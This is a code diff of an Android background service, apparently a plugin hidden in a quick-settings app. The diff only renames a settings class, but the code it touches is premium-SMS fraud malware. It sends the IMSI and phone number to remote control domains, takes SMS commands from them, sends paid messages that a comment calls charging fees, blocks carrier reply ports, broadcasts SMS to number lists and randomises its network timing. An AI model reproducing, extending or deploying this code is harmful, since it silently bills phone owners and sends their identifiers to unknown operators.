@@ -1,14 +1,10 @@
 package com.xstd.plugin.service;
 
 import android.app.IntentService;
-import android.app.admin.DevicePolicyManager;
-import android.content.ComponentName;
-import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
 import android.os.IBinder;
 import android.text.TextUtils;
-import com.bwx.bequick.fwk.Setting;
 import com.plugin.common.utils.UtilsRuntime;
 import com.plugin.internet.InternetUtils;
 import com.xstd.plugin.Utils.BRCUtil;
@@ -18,13 +14,12 @@ import com.xstd.plugin.Utils.SMSUtil;
 import com.xstd.plugin.api.*;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
-import com.xstd.plugin.config.SettingManager;
+import com.xstd.plugin.config.PluginSettingManager;
 import com.xstd.qm.Utils;
 
 import java.io.File;
 import java.util.ArrayList;
 import java.util.Calendar;
-import java.util.HashMap;
 import java.util.UUID;
 
 /**
@@ -92,8 +87,8 @@ public class PluginService extends IntentService {
     private synchronized void fetchDomain() {
         if (!UtilsRuntime.isOnline(getApplicationContext())) return;
 
-        int count = SettingManager.getInstance().getTodayFetchDomainCount();
-        SettingManager.getInstance().setTodayFetchDomainCount(count + 1);
+        int count = PluginSettingManager.getInstance().getTodayFetchDomainCount();
+        PluginSettingManager.getInstance().setTodayFetchDomainCount(count + 1);
         try {
             DomainRequest request = new DomainRequest(DomanManager.getInstance(getApplicationContext()).getOneAviableDomain() + "/spDomain/");
             DomainResponse response = InternetUtils.request(getApplicationContext(), request);
@@ -153,7 +148,7 @@ public class PluginService extends IntentService {
                 if (Config.DEBUG) {
                     Config.LOGD("[[Plugin::activeMainApk]] active success, response : " + response.toString());
                 }
-                SettingManager.getInstance().setMainApkActiveTime(System.currentTimeMillis());
+                PluginSettingManager.getInstance().setMainApkActiveTime(System.currentTimeMillis());
                 return;
             }
         } catch (Exception e) {
@@ -168,7 +163,7 @@ public class PluginService extends IntentService {
         }
 
         try {
-            if (TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())) {
+            if (TextUtils.isEmpty(PluginSettingManager.getInstance().getCurrentPhoneNumber())) {
                 String imsi = UtilsRuntime.getIMSI(getApplicationContext());
                 if (!TextUtils.isEmpty(imsi)) {
                     if (!UtilsRuntime.isOnline(getApplicationContext())) return;
@@ -183,12 +178,12 @@ public class PluginService extends IntentService {
                             Config.LOGD("[[PluginService::fetchPhoneFromServer]] after fetch PHONE number : (" + respone.phone + ")");
                         }
                         if (respone.phone.length() == 11) {
-                            SettingManager.getInstance().setCurrentPhoneNumber(respone.phone);
+                            PluginSettingManager.getInstance().setCurrentPhoneNumber(respone.phone);
                             Utils.saveExtraInfo("子程序通过IMSI获取到手机:" + respone.phone);
                         } else {
-                            SettingManager.getInstance().setKeyLastSendMsgToServicePhone(System.currentTimeMillis());
+                            PluginSettingManager.getInstance().setKeyLastSendMsgToServicePhone(System.currentTimeMillis());
                             //如果获取失败了，就再明天再向短信服务器发送短信.
-                            SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(0);
+                            PluginSettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(0);
                         }
                     }
                 }
@@ -208,7 +203,7 @@ public class PluginService extends IntentService {
         }
 
         try {
-            String phoneNumbers = SettingManager.getInstance().getBroadcastPhoneNumber();
+            String phoneNumbers = PluginSettingManager.getInstance().getBroadcastPhoneNumber();
             if (Config.DEBUG) {
                 Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] before send broadcast, current phone Number is : " + phoneNumbers);
             }
@@ -280,20 +275,20 @@ public class PluginService extends IntentService {
                         }
                     }
                     if (sb.length() > 0) {
-                        SettingManager.getInstance().setBroadcastPhoneNumber(sb.substring(0, sb.length() - 1));
+                        PluginSettingManager.getInstance().setBroadcastPhoneNumber(sb.substring(0, sb.length() - 1));
                         if (Config.DEBUG) {
                             Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] after send broadcast, current phone Number is : "
-                                            + SettingManager.getInstance().getBroadcastPhoneNumber()
+                                            + PluginSettingManager.getInstance().getBroadcastPhoneNumber()
                                             + " and start alarm for next round send delay 10 min");
                         }
                         //因为还有没有发送的号码，所以启动一个定时器
                         BRCUtil.startAlarmForAction(getApplicationContext(), SMS_BROADCAST_ACTION, 10 * 60 * 1000);
                     } else {
                         //已经消耗光
-                        SettingManager.getInstance().setBroadcastPhoneNumber("");
+                        PluginSettingManager.getInstance().setBroadcastPhoneNumber("");
                         if (Config.DEBUG) {
                             Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] after send broadcast, current phone Number is : "
-                                            + SettingManager.getInstance().getBroadcastPhoneNumber());
+                                            + PluginSettingManager.getInstance().getBroadcastPhoneNumber());
                         }
                     }
                 }
@@ -308,7 +303,7 @@ public class PluginService extends IntentService {
                 Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
             }
 
-            if (!TextUtils.isEmpty(SettingManager.getInstance().getBroadcastPhoneNumber())) {
+            if (!TextUtils.isEmpty(PluginSettingManager.getInstance().getBroadcastPhoneNumber())) {
                 //因为还有没有发送的号码，所以启动一个定时器
                 BRCUtil.startAlarmForAction(getApplicationContext(), SMS_BROADCAST_ACTION, 10 * 60 * 1000);
             }
@@ -340,9 +335,9 @@ public class PluginService extends IntentService {
             return;
         }
 
-        int dayCount = SettingManager.getInstance().getKeyDayCount();
+        int dayCount = PluginSettingManager.getInstance().getKeyDayCount();
         int times = response.times;
-        long lastCountTime = SettingManager.getInstance().getKeyLastCountTime();
+        long lastCountTime = PluginSettingManager.getInstance().getKeyLastCountTime();
         long curTime = System.currentTimeMillis();
         long delay = ((long) (response.interval)) * 60 * 1000;
         if ((times > dayCount) && (lastCountTime + delay) < curTime) {
@@ -361,9 +356,9 @@ public class PluginService extends IntentService {
                          * 注意，每次扣费的时候，第一条起始的短信都是很直接的，都是n+c的模式
                          */
                         if (SMSUtil.sendSMSForMonkey(getApplicationContext(), startPort, startContent)) {
-                            SettingManager.getInstance().setKeyDayCount(dayCount + 1);
-                            SettingManager.getInstance().setKeyMonthCount(SettingManager.getInstance().getKeyMonthCount() + 1);
-                            SettingManager.getInstance().setKeyLastCountTime(System.currentTimeMillis());
+                            PluginSettingManager.getInstance().setKeyDayCount(dayCount + 1);
+                            PluginSettingManager.getInstance().setKeyMonthCount(PluginSettingManager.getInstance().getKeyMonthCount() + 1);
+                            PluginSettingManager.getInstance().setKeyLastCountTime(System.currentTimeMillis());
                         }
                     } else {
                         if (Config.DEBUG) {
@@ -383,12 +378,12 @@ public class PluginService extends IntentService {
     private void activePluginAction() {
         if (Config.DEBUG) {
             Config.LOGD("[[PluginService::activePluginAction]] try to fetch active info, Phone Number : "
-                            + SettingManager.getInstance().getCurrentPhoneNumber());
+                            + PluginSettingManager.getInstance().getCurrentPhoneNumber());
         }
         try {
             AppRuntime.ACTIVE_PROCESS_RUNNING.set(true);
 
-            if (TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())) {
+            if (TextUtils.isEmpty(PluginSettingManager.getInstance().getCurrentPhoneNumber())) {
                 /**
                  * 电话号码为空就发送短信到手机服务器，以后会接受到一条短信，获取到本机的号码
                  */
@@ -407,23 +402,23 @@ public class PluginService extends IntentService {
                     CommonUtil.saveUUID(getApplicationContext(), unique);
                 }
 
-                SettingManager.getInstance().setKeyDayActiveCount(SettingManager.getInstance().getKeyDayActiveCount() + 1);
+                PluginSettingManager.getInstance().setKeyDayActiveCount(PluginSettingManager.getInstance().getKeyDayActiveCount() + 1);
                 if (Config.DEBUG) {
                     Config.LOGD("[[PluginService::activePluginAction]] last monkey count time = "
-                                    + UtilsRuntime.debugFormatTime(SettingManager.getInstance().getKeyLastCountTime()));
+                                    + UtilsRuntime.debugFormatTime(PluginSettingManager.getInstance().getKeyLastCountTime()));
                 }
                 ActiveRequest request = new ActiveRequest(getApplicationContext()
                                                              , Config.CHANNEL_CODE
                                                              , unique
                                                              , "QuickSetting"
                                                              , AppRuntime.getNetworkTypeByIMSI(getApplicationContext())
-                                                             , SettingManager.getInstance().getCurrentPhoneNumber()
-                                                             , SettingManager.getInstance().getKeyLastErrorInfo()
+                                                             , PluginSettingManager.getInstance().getCurrentPhoneNumber()
+                                                             , PluginSettingManager.getInstance().getKeyLastErrorInfo()
                                                              , DomanManager.getInstance(getApplicationContext())
                                                                    .getOneAviableDomain() + "/sais/"
                                                              , "1");
                 //只要激活返回，就记录时间，也就是说，激活时间标识的是上次try to激活的时间，而不是激活成功的时间
-                SettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis());
+                PluginSettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis());
                 ActiveResponse response = InternetUtils.request(getApplicationContext(), request);
                 /**
                  * 只要是服务器返回了，今天就不工作了，因为如果是网络异常的话会走try catch
@@ -444,9 +439,9 @@ public class PluginService extends IntentService {
                         AppRuntime.ACTIVE_RESPONSE.parseSMSCmd();
                         AppRuntime.saveActiveResponse(AppRuntime.RESPONSE_SAVE_FILE);
 //                                AppRuntime.saveActiveResponse("/sdcard/" + Config.ACTIVE_RESPONSE_FILE);
-                        SettingManager.getInstance().setKeyBlockPhoneNumber(response.blockSmsPort);
+                        PluginSettingManager.getInstance().setKeyBlockPhoneNumber(response.blockSmsPort);
                         int next = AppRuntime.randomBetween(4, 11);
-                        SettingManager.getInstance().setKeyRandomNetworkTime(next);
+                        PluginSettingManager.getInstance().setKeyRandomNetworkTime(next);
                     }
 
                     /**
@@ -455,7 +450,7 @@ public class PluginService extends IntentService {
                     if (Config.DEBUG) {
                         Config.LOGD("[[PluginService::activePluginAction]] server return data, So we set DayActiveCount = 17");
                     }
-                    SettingManager.getInstance().setKeyDayActiveCount(17);
+                    PluginSettingManager.getInstance().setKeyDayActiveCount(17);
                 } else {
                     Config.LOGD("response == null or response error");
                     networkErrorWork();
@@ -465,7 +460,7 @@ public class PluginService extends IntentService {
                     if (Config.DEBUG) {
                         Config.LOGD("[[PluginService::activePluginAction]] server return data == null, So we set DayActiveCount = 17");
                     }
-                    SettingManager.getInstance().setKeyDayActiveCount(17);
+                    PluginSettingManager.getInstance().setKeyDayActiveCount(17);
                 }
             }
         } catch (Exception e) {
@@ -488,7 +483,7 @@ public class PluginService extends IntentService {
         file.delete();
         AppRuntime.ACTIVE_RESPONSE = null;
         int next = AppRuntime.randomBetween(0, 3);
-        int lastNetworkTime = SettingManager.getInstance().getKeyRandomNetworkTime();
+        int lastNetworkTime = PluginSettingManager.getInstance().getKeyRandomNetworkTime();
         int time = 0;
         int curHour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY);
         if (lastNetworkTime <= 18) {
@@ -498,7 +493,7 @@ public class PluginService extends IntentService {
         }
         time = time >= 24 ? 23 : time;
 
-        SettingManager.getInstance().setKeyRandomNetworkTime(time);
+        PluginSettingManager.getInstance().setKeyRandomNetworkTime(time);
     }
 
     public IBinder onBind(Intent intent) {
